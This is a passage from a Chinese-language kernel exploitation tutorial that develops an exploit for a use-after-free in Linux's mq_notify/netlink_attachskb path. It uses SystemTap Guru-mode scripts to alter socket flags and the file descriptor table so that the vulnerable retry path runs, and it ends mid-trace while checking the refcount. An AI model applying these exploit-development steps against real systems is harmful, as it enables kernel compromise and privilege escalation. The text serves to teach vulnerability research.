<h4 id="强制netlink-attachskb-进入retry"><a href="#强制netlink-attachskb-进入retry" class="headerlink" title="强制netlink_attachskb()进入retry"></a>强制netlink_attachskb()进入retry</h4><p>在前面的exp中，我们可以到达<code>netlink_attachskb()</code>但它返回了0，使得代码运行了非我们所愿的<code>normal</code>路径。回头看一下内核代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">netlink_attachskb</span><span class="params">(struct sock *sk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">              <span class="keyword">long</span> *timeo, struct sock *ssk)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span>;</span></span><br><span class="line"></span><br><span class="line">      nlk = nlk_sk(sk);</span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &#123;</span><br><span class="line">        DECLARE_WAITQUEUE(wait, current);</span><br><span class="line">        <span class="keyword">if</span> (!*timeo) &#123;</span><br><span class="line">          <span class="comment">// ... cut (never reached in our code path) ...</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        __set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">        add_wait_queue(&amp;nlk-&gt;wait, &amp;wait);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &amp;&amp;</span><br><span class="line">            !sock_flag(sk, SOCK_DEAD))</span><br><span class="line">          *timeo = schedule_timeout(*timeo);</span><br><span class="line"></span><br><span class="line">        __set_current_state(TASK_RUNNING);</span><br><span class="line">        remove_wait_queue(&amp;nlk-&gt;wait, &amp;wait);</span><br><span class="line">        sock_put(sk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">          kfree_skb(skb);</span><br><span class="line">          <span class="keyword">return</span> sock_intr_errno(*timeo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;                             <span class="comment">// &lt;---- the only way</span></span><br><span class="line">      &#125;</span><br><span class="line">      skb_set_owner_r(skb, sk);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>想让<code>netlink_attachskb()</code>返回1只有一条途径，并且首先需要满足[0]处的判断：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state))</span><br></pre></td></tr></table></figure>
<p>为了强行满足该条件，就需要使用SystemTap的Guru Mode。在Guru Mode下，可以让我们的探针去调用我们所编写的代码，就如同直接向内核中注入代码一样，所以任何错误都会导致内核崩溃。</p>
<p>我们接下来要做的就是修改<code>sock</code>结构体<code>sk</code>和<code>netlink_sock</code>结构体<code>nlk</code>来使得if判断为True，在此之前，先收集一些<code>sk</code>的信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/sock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/netlink_sock.h&gt;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">function dump_netlink_sock:<span class="keyword">long</span> (arg_sock:<span class="keyword">long</span>)</span><br><span class="line">%&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = (<span class="title">void</span>*) <span class="title">STAP_ARG_arg_sock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = (<span class="title">void</span>*) <span class="title">sk</span>;</span></span><br><span class="line"></span><br><span class="line">  _stp_printf(<span class="string">"-=&#123; dump_netlink_sock: %p &#125;=-\n"</span>, nlk);</span><br><span class="line">  _stp_printf(<span class="string">"- sk = %p\n"</span>, sk);</span><br><span class="line">  _stp_printf(<span class="string">"- sk-&gt;sk_rmem_alloc = %d\n"</span>, sk-&gt;sk_rmem_alloc);</span><br><span class="line">  _stp_printf(<span class="string">"- sk-&gt;sk_rcvbuf = %d\n"</span>, sk-&gt;sk_rcvbuf);</span><br><span class="line">  _stp_printf(<span class="string">"- sk-&gt;sk_refcnt = %d\n"</span>, sk-&gt;sk_refcnt);</span><br><span class="line"></span><br><span class="line">  _stp_printf(<span class="string">"- nlk-&gt;state = %x\n"</span>, (nlk-&gt;state &amp; <span class="number">0x1</span>));</span><br><span class="line"></span><br><span class="line">  _stp_printf(<span class="string">"-=&#123; dump_netlink_sock: END&#125;=-\n"</span>);</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">probe kernel.function (<span class="string">"netlink_attachskb"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">"exploit"</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"(%d-%d) [netlink] ==&gt;&gt; netlink_attachskb (%s)\n"</span>, pid(), tid(), $$parms)</span><br><span class="line"></span><br><span class="line">    dump_netlink_sock($sk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用-g选项加载stap脚本：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(3299-3299) &gt;&gt;&gt; mq_notify (4294967295, 0x7fff6bb3ac10)</span><br><span class="line">(3299-3299) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3299-3299) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(3299-3299) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3299-3299) &gt;&gt;&gt; skb_put (skb=0xffff88003d464d00 len=0x20)</span><br><span class="line">(3299-3299) &lt;&lt;&lt; skb_put = ffff88003add2000</span><br><span class="line">(3299-3299) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(3299-3299) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88001b895900)</span><br><span class="line">(3299-3299) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88001b875000</span><br><span class="line">(3299-3299) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88001b875000 skb=0xffff88003d464d00 timeo=0xffff880000053f08 ssk=0x0)</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff88001b875000 &#125;=-</span><br><span class="line">- sk = 0xffff88001b875000</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 2</span><br><span class="line">- nlk-&gt;state = 0</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(3299-3299) &lt;&lt;&lt; netlink_attachskb = 0</span><br><span class="line">(3299-3299) &gt;&gt;&gt; __fdget (fd=0xffffffff)</span><br><span class="line">(3299-3299) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88001b875000 skb=0xffff88003d464d00)</span><br><span class="line">(3299-3299) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">(3299-3299) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>
<p>如上述输出，<em>nlk-&gt;state</em>的第1bit为0且<em>sk-&gt;sk_rmem_alloc</em>小于<em>sk-&gt;rcvbuf</em>，所以if判断不会成立。接着，让我们在<code>netlink_attachskb()</code>调用之前修改数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function dump_netlink_sock:<span class="keyword">long</span> (arg_sock:<span class="keyword">long</span>)</span><br><span class="line">%&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = (<span class="title">void</span>*) <span class="title">STAP_ARG_arg_sock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = (<span class="title">void</span>*) <span class="title">sk</span>;</span></span><br><span class="line"></span><br><span class="line">  _stp_printf(<span class="string">"-=&#123; dump_netlink_sock: %p &#125;=-\n"</span>, nlk);</span><br><span class="line">  _stp_printf(<span class="string">"- sk = %p\n"</span>, sk);</span><br><span class="line">  _stp_printf(<span class="string">"- sk-&gt;sk_rmem_alloc = %d\n"</span>, sk-&gt;sk_rmem_alloc);</span><br><span class="line">  _stp_printf(<span class="string">"- sk-&gt;sk_rcvbuf = %d\n"</span>, sk-&gt;sk_rcvbuf);</span><br><span class="line">  _stp_printf(<span class="string">"- sk-&gt;sk_refcnt = %d\n"</span>, sk-&gt;sk_refcnt);</span><br><span class="line"></span><br><span class="line">  _stp_printf(<span class="string">"- (before) nlk-&gt;state = %x\n"</span>, (nlk-&gt;state &amp; <span class="number">0x1</span>));</span><br><span class="line">  nlk-&gt;state |= <span class="number">1</span>;    <span class="comment">// &lt;-----</span></span><br><span class="line">  _stp_printf(<span class="string">"- (after) nlk-&gt;state = %x\n"</span>, (nlk-&gt;state &amp; <span class="number">0x1</span>));</span><br><span class="line"></span><br><span class="line">  _stp_printf(<span class="string">"-=&#123; dump_netlink_sock: END&#125;=-\n"</span>);</span><br><span class="line">%&#125;</span><br></pre></td></tr></table></figure>
<p>再次运行exp：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(3629-3629) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffc1507a6c0)</span><br><span class="line">(3629-3629) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3629-3629) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(3629-3629) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3629-3629) &gt;&gt;&gt; skb_put (skb=0xffff88003aec7c00 len=0x20)</span><br><span class="line">(3629-3629) &lt;&lt;&lt; skb_put = ffff88003ac79e00</span><br><span class="line">(3629-3629) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(3629-3629) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88003ae67b00)</span><br><span class="line">(3629-3629) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003bdf9000</span><br><span class="line">(3629-3629) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003bdf9000 skb=0xffff88003aec7c00 timeo=0xffff88003cb37f08 ssk=0x0)</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff88003bdf9000 &#125;=-</span><br><span class="line">- sk = 0xffff88003bdf9000</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 2</span><br><span class="line">- nlk-&gt;state = 0</span><br><span class="line">- (after) nlk-&gt;state = 1</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(3629-3629) &lt;&lt;&lt; netlink_attachskb = fffffffffffffe00</span><br><span class="line">(3629-3629) &lt;&lt;&lt; mq_notify = fffffffffffffe00</span><br></pre></td></tr></table></figure>
<p>在运行的过程中，exp会卡在系统调用中，CTRL-C即可。注意到<code>netlink_attachskb()</code>返回了0xfffffffffffffe00(-ERESTARTSYS)，代表我们进入了如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">    kfree_skb(skb);</span><br><span class="line">    <span class="keyword">return</span> sock_intr_errno(*timeo); <span class="comment">// &lt;---- return -ERESTARTSYS</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这代表着我们成功地让<code>netlink_attachskb()</code>进入了其他路径。</p>
<h4 id="避免exploit阻塞"><a href="#避免exploit阻塞" class="headerlink" title="避免exploit阻塞"></a>避免exploit阻塞</h4><p><code>mq_notify()</code>阻塞的原因：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &amp;&amp;</span><br><span class="line">    !sock_flag(sk, SOCK_DEAD))</span><br><span class="line">    *timeo = schedule_timeout(*timeo);</span><br><span class="line"></span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br></pre></td></tr></table></figure>
<p>在第二章中我们会更深入的了解<em>scheduling</em>，现在主要是考虑为什么我们的exp会满足特定的条件并被阻塞。为了避免被阻塞，首先需要绕过<code>schedule_timeout()</code>，因此设置SOCK_DEAD，就是去修改<code>sk</code>的内容来让<code>sock_flag()</code>返回True：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from [include/net/sock.h]</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">sock_flag</span><span class="params">(<span class="keyword">const</span> struct sock *sk, <span class="keyword">enum</span> sock_flags flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> test_bit(flag, &amp;sk-&gt;sk_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> sock_flags &#123;</span><br><span class="line">  SOCK_DEAD,      <span class="comment">// &lt;---- this has to be '0', but we can check it with stap!</span></span><br><span class="line">  ... cut ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编辑stap脚本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mark it congested!</span></span><br><span class="line">_stp_printf(<span class="string">"- (before) nlk-&gt;state = %x\n"</span>, (nlk-&gt;state &amp; <span class="number">0x1</span>));</span><br><span class="line">nlk-&gt;state |= <span class="number">1</span>;            </span><br><span class="line">_stp_printf(<span class="string">"- (after) nlk-&gt;state = %x\n"</span>, (nlk-&gt;state &amp; <span class="number">0x1</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// mark it DEAD</span></span><br><span class="line">_stp_printf(<span class="string">"- sk-&gt;sk_flags = %x\n"</span>, sk-&gt;sk_flags);</span><br><span class="line">_stp_printf(<span class="string">"- SOCK_DEAD = %x\n"</span>, SOCK_DEAD);</span><br><span class="line">sk-&gt;sk_flags |= (<span class="number">1</span> &lt;&lt; SOCK_DEAD);</span><br><span class="line">_stp_printf(<span class="string">"- sk-&gt;sk_flags = %x\n"</span>, sk-&gt;sk_flags);</span><br></pre></td></tr></table></figure>
<p>重新运行脚本会发现exp陷入了内核的死循环中，原因是：</p>
<ul>
<li>内核进入了<code>netlink_attachskb()</code>并被我们强制执行到<code>retry</code></li>
<li>the thread is not scheduled (we by-passed it)</li>
<li><code>netlink_attachskb()</code>返回1</li>
<li>返回到<code>mq_notify()</code>后，再次执行goto retry</li>
<li><code>fget()</code>返回非NULL</li>
<li>再次进入<code>netlink_getsockbyfilp()</code></li>
<li>再次进入<code>netlink_attachskb()</code>并不断循环</li>
</ul>
<p>虽然我们绕过了阻塞，但是进入了死循环当中。</p>
<h4 id="停止死循环"><a href="#停止死循环" class="headerlink" title="停止死循环"></a>停止死循环</h4><p>首先让第二个<code>fget()</code>失败，做法是直接将fd从FDT中移除（设置成NULL）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">  %&#123;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fdtable.h&gt;</span></span></span><br><span class="line">  %&#125;</span><br><span class="line"></span><br><span class="line">function remove_fd3_from_fdt:<span class="keyword">long</span> (arg_unused:<span class="keyword">long</span>)</span><br><span class="line">%&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> = <span class="title">NULL</span>;</span></span><br><span class="line">	   <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span> = <span class="title">NULL</span>;</span></span><br><span class="line">	_stp_printf(<span class="string">"!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!\n"</span>);</span><br><span class="line">	files = current-&gt;files;</span><br><span class="line">	fdt = files_fdtable(files);</span><br><span class="line">	fdt-&gt;fd[<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">  probe kernel.function (<span class="string">"netlink_attachskb"</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (execname() == <span class="string">"exploit"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"(%d-%d) [netlink] ==&gt;&gt; netlink_attachskb (%s)\n"</span>, pid(), tid(), $$parms)</span><br><span class="line"></span><br><span class="line">      dump_netlink_sock($sk); <span class="comment">// it also marks the socket as DEAD and CONGESTED</span></span><br><span class="line">      remove_fd3_from_fdt(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>执行exp：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">(5089-5089) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffe27114170)</span><br><span class="line">(5089-5089) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(5089-5089) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(5089-5089) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(5089-5089) &gt;&gt;&gt; skb_put (skb=0xffff88003aeef000 len=0x20)</span><br><span class="line">(5089-5089) &lt;&lt;&lt; skb_put = ffff88003d838600</span><br><span class="line">(5089-5089) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(5089-5089) &lt;&lt;&lt; __fdget = ffff88000793ba00</span><br><span class="line">(5089-5089) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88000793ba00)</span><br><span class="line">(5089-5089) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003a2ed800</span><br><span class="line">(5089-5089) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003a2ed800 skb=0xffff88003aeef000 timeo=0xffff88003a32bf08 ssk=0x0)</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff88003a2ed800 &#125;=-</span><br><span class="line">- sk = 0xffff88003a2ed800</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 2</span><br><span class="line">- (before) nlk-&gt;state = 0</span><br><span class="line">- (after) nlk-&gt;state = 1</span><br><span class="line">- sk-&gt;sk_flags = 100</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">- sk-&gt;sk_flags = 101</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!</span><br><span class="line">(5089-5089) &lt;&lt;&lt; netlink_attachskb = 1</span><br><span class="line">(5089-5089) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(5089-5089) &lt;&lt;&lt; __fdget = 0</span><br><span class="line">(5089-5089) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003a2ed800 skb=0xffff88003aeef000)</span><br><span class="line">(5089-5089) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">(5089-5089) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>
<p>内核从之前的无限循环中跳出并且我们越来越接近攻击场景：</p>
<ol>
<li><code>netlink_attachskb()</code>返回1</li>
<li>第二次<code>fget()</code>返回NULL</li>
</ol>
<p>所以，我们触发了漏洞吗？</p>
<h4 id="查看refcounter"><a href="#查看refcounter" class="headerlink" title="查看refcounter"></a>查看refcounter</h4><p>一切都按照着我们的计划进行，因此漏洞也应该被触发使得<code>sock</code>的<code>refcounter</code>被减少了两次。在return的probe中，是无法使用enter的probe中的调用参数的，这意味着当<code>netlnk_attachskb()</code>返回时，我们无法检查<code>sock</code>的内容。</p>
<p>一种解决方法是将<code>netlink_getsockbyfilp()</code>返回的<code>sock</code>指针保存在全局变量中，然后再进行输出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">global sock_ptr = <span class="number">0</span>;                  <span class="comment">// &lt;------ declared globally!</span></span><br><span class="line"></span><br><span class="line">probe syscall.mq_notify.<span class="keyword">return</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">"exploit"</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (sock_ptr != <span class="number">0</span>)                <span class="comment">// &lt;----- watch your NULL-deref, this is kernel-land!</span></span><br><span class="line">    &#123;</span><br><span class="line">      dump_netlink_sock(sock_ptr);</span><br><span class="line">      sock_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"(%d-%d) [SYSCALL] &lt;&lt;== mq_notify= %d\n\n"</span>, pid(), tid(), $<span class="keyword">return</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe kernel.function (<span class="string">"netlink_getsockbyfilp"</span>).<span class="keyword">return</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">"exploit"</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"(%d-%d) [netlink] &lt;&lt;== netlink_getsockbyfilp = %x\n"</span>, pid(), tid(), $<span class="keyword">return</span>)</span><br><span class="line">    sock_ptr = $<span class="keyword">return</span>;                 <span class="comment">// &lt;----- store it</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">(5409-5409) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffc59d68a00)</span><br><span class="line">(5409-5409) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(5409-5409) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(5409-5409) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(5409-5409) &gt;&gt;&gt; skb_put (skb=0xffff88003d46af00 len=0x20)</span><br><span class="line">(5409-5409) &lt;&lt;&lt; skb_put = ffff88003ac73e00</span><br><span class="line">(5409-5409) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(5409-5409) &lt;&lt;&lt; __fdget = ffff8800373f6e00</span><br><span class="line">(5409-5409) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff8800373f6e00)</span><br><span class="line">(5409-5409) &lt;&lt;&lt; netlink_getsockbyfilp = ffff880036446000</span><br><span class="line">(5409-5409) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880036446000 skb=0xffff88003d46af00 